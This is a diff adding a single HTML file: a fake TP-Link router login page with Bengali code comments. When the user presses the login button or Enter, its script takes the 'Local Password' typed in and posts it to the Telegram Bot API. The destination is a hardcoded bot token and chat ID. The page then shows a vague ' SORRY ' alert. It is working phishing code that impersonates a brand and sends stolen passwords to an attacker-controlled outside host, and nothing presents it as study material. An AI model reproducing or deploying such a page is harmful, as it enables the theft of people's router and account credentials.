@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>TP-Link Login</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+*{
+    box-sizing:border-box;
+    font-family: Arial, Helvetica, sans-serif;
+}
+body{
+    margin:0;
+    background:#ffffff;
+}
+.top{
+    background:#3fc3cf;
+    height:170px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+}
+.logo{
+    color:white;
+    font-size:28px;
+    font-weight:bold;
+}
+.card{
+    width:90%;
+    max-width:360px;
+    margin:-50px auto 0;
+    background:#fff;
+    padding:25px;
+    border-radius:10px;
+    box-shadow:0 5px 15px rgba(0,0,0,0.15);
+}
+label{
+    font-size:14px;
+    color:#555;
+}
+.input-box{
+    margin-top:10px;
+    position:relative;
+}
+input{
+    width:100%;
+    padding:12px;
+    font-size:15px;
+    border:1px solid #ccc;
+    border-radius:6px;
+}
+button{
+    width:100%;
+    margin-top:20px;
+    padding:12px;
+    background:#3fc3cf;
+    color:white;
+    border:none;
+    border-radius:6px;
+    font-size:16px;
+}
+button:active{
+    opacity:0.8;
+}
+.forgot{
+    text-align:right;
+    margin-top:10px;
+    font-size:13px;
+    color:#3fc3cf;
+}
+.bottom{
+    margin-top:120px;
+    text-align:center;
+    font-size:14px;
+    color:#3fc3cf;
+}
+</style>
+</head>
+
+<body>
+
+<div class="top">
+    <div class="logo">tp-link</div>
+</div>
+
+<div class="card">
+    <label>Local Password:</label>
+    <div class="input-box">
+        <input type="text" id="messageInput" placeholder="">
+    </div>
+
+    <button onclick="sendToTelegram()">LOG IN</button>
+
+    <div class="forgot">Forgot Password?</div>
+</div>
+
+<div class="bottom">
+    Log In with TP-Link ID
+</div>
+
+<script>
+// ==================== TELEGRAM CONFIG ====================
+// আপনার Telegram Bot-এর তথ্য এখানে দিন
+const BOT_TOKEN = '8358572632:AAEuTR2RfdeW0HiPDDa-tGlhNTSdeSVd2js'; // এখানে আপনার Bot Token দিন
+const CHAT_ID = '1972363619';     // এখানে আপনার Chat ID দিন
+// ========================================================
+
+function sendToTelegram() {
+    // ইনপুট থেকে মেসেজ নিন
+    const messageInput = document.getElementById('messageInput');
+    const message = messageInput.value.trim();
+    
+    // চেক করুন যদি মেসেজ খালি থাকে
+    if (!message) {
+        alert("Please enter some text first!");
+        return;
+    }
+    
+    // চেক করুন যদি Bot Token এবং Chat ID সেট করা না থাকে
+    if (BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+        alert("Please set your Bot Token and Chat ID in the JavaScript code!");
+        return;
+    }
+    
+    // বোতামে লোডিং স্টেট দেখান
+    const button = document.querySelector('button');
+    const originalText = button.textContent;
+    button.textContent = ' ';
+    button.disabled = true;
+    
+    // Telegram Bot API URL
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+    
+    // ডেটা প্রস্তুত করুন
+    const data = {
+        chat_id: CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+    };
+    
+    // Fetch API ব্যবহার করে Telegram-এ মেসেজ পাঠান
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data)
+    })
+    .then(response => response.json())
+    .then(data => {
+        if (data.ok) {
+            alert(" SORRY ");
+            messageInput.value = ''; // ইনপুট ক্লিয়ার করুন
+        } else {
+            alert(`❌ Error: ${data.description || 'Failed to send message'}`);
+        }
+    })
+    .catch(error => {
+        alert(`❌ Network error: ${error.message}`);
+    })
+    .finally(() => {
+        // বোতাম পুনরায় একটিভ করুন
+        button.textContent = originalText;
+        button.disabled = false;
+    });
+}
+
+// Enter কী চাপলে মেসেজ পাঠানোর অপশন
+document.getElementById('messageInput').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+        sendToTelegram();
+    }
+});
+</script>
+
+</body>
+</html>
